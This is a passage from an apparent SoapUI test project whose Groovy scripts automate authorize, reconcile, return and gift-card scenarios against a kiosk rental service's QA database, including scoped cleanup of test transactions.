tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("DiscountAmountList", authtc.getPropertyValue("DiscountAmountList")); //PROMO
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("RCFlag", authtc.getPropertyValue("RCFlag"));
tc.setPropertyValue("rentalRCFlag", authtc.getPropertyValue("rentalRCFlag"));
tc.setPropertyValue("purchaseRCFlag", authtc.getPropertyValue("purchaseRCFlag"));
//MDV
tc.setPropertyValue("RentalMDVFlag", authtc.getPropertyValue("RentalMDVFlag"));
tc.setPropertyValue("RentalMDVDiscNumber", authtc.getPropertyValue("RentalMDVDiscNumber"));
tc.setPropertyValue("PurchaseMDVFlag", authtc.getPropertyValue("PurchaseMDVFlag"));
tc.setPropertyValue("PurchaseMDVDiscNumber", authtc.getPropertyValue("PurchaseMDVDiscNumber"));

if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Reconcile] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Return" id="bd3e696b-ee3c-4e1c-a346-efe647a37d11"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
//log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");

//Get Scenario Count
testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())

//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	//testRunner.gotoStepByName("DataSource Loop");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
	
		if(tcStatus == "FAIL")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			//testRunner.gotoStepByName("DataSource Loop");
			testRunner.gotoStepByName("DataSource Loop");
		}
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="2afdde19-5751-45fc-8ede-3435cb2c2f95"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="9a181589-0c06-4696-8f9a-1bc6177f6f46"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (75760,309946,321704,321703) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (75760,309946,321704,321703)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505");

testRunner.testCase.setPropertyValue("ScenarioCount", "0");</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");
def scenarioCount = context.expand( '${#TestCase#ScenarioCount}' )

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info("Scenario Count : $scenarioCount");
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1991328</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149076162</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90855364928109</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Return PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>156</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>12/31/18-12:10:29.115</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>12/31/18-12:11:36.946</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>1</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>a8906ad3-5a0b-464d-8fb3-271772092709</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="2d21e5b3-fad2-4d2e-872c-f0bb816bbbeb" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="GiftCard" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="8f85add3-ebcd-4dc1-8873-c1646ad33a93"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="3039f993-1c27-4546-b32a-65b1e75817d5"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="JDBC"><con:configuration><driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</driver><connstr>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</connstr><pass>t</pass><Connection>QaAutomation( QAInt )</Connection><query>Select 
	KS_GiftCard.ID As ID, 
	KS_GiftCard.Scenario As Scenario, 
	KS_GiftCard.Email As Email, 
	KS_GiftCard.CreditCardNumber As Ccnumber, 
	KS_GiftCard.CreditCardType As CCType, 
	KS_GiftCard.GCPin As GCPin, 
	KS_GiftCard.PromoCode As PromoCode, 
	KS_GiftCard.PromoValue As PromoValue, 
	KS_GiftCard.KioskID As KioskID, 
	KS_GiftCard.RentalFormats As rentalFormats, 
	KS_GiftCard.NumberOfRentals As numOfRentals,
	KS_GiftCard.RentalVendStatus As RentalVendStatus,
	KS_GiftCard.PurchaseFormats As PurchaseFormats, 
	KS_GiftCard.NumberOfPurchases As numOfPurchases, 
	KS_GiftCard.PurchaseVendStatus As PurchaseVendStatus,
	KS_GiftCard.SetDaysBack As SetDaysBack, 
	KS_GiftCard.IsOffline As IsOffline,
	KS_GiftCard.LoyaltyFlag As LoyaltyFlag
From KS_GiftCard</query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>ID</con:property><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>GCPin</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>IsOffline</con:property><con:property>LoyaltyFlag</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="cdd1188c-3709-4194-a007-8c1ce741267e"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("--------------------------------" + context.testCase.name + "------------------------------");
log.info ("Scenario [$ScenarioNo]:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );
def GCPin = context.expand( '${DataSource#GCPin}' );

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason


//Get CustomerProfile Info.
def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
def CardAccountID = getCP.getPropertyValue("CardAccountId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}

//Reload GiftCard
def reloadTC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["ReloadGiftCard"];

for(int j=0;j&lt;reloadTC.getPropertyCount();j++)
{
  reloadTC.getPropertyAt(j).setValue("");
}

reloadTC.setPropertyValue("CardAccountID",CardAccountID.toString());
reloadTC.setPropertyValue("CardExists",'1');
reloadTC.setPropertyValue("CardNumber",ccNumber.toString());
reloadTC.setPropertyValue("GCPin",GCPin.toString());
def reloadTCrunner = reloadTC.run( null, false );	
// show that it worked out ok
log.info("Status: $reloadTCrunner.status, time taken for TestCase [ReloadGiftCard] was: $reloadTCrunner.timeTaken ms");
// assert that it didn't fail
assert reloadTCrunner.status != Status.FAILED : reloadTCrunner.reason</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="5fdd0f96-ee67-4e38-97a5-98fda8251866"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");
tc.setPropertyValue("HasOffer", "false");
tc.setPropertyValue("MDVFlag", '');
tc.setPropertyValue("MDVDiscNumber",'');

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [GCAuthorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","GCAuthorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","GCAuthorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Reconcile" id="98ef0842-5e5c-4913-a1df-502d5ea113cb"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
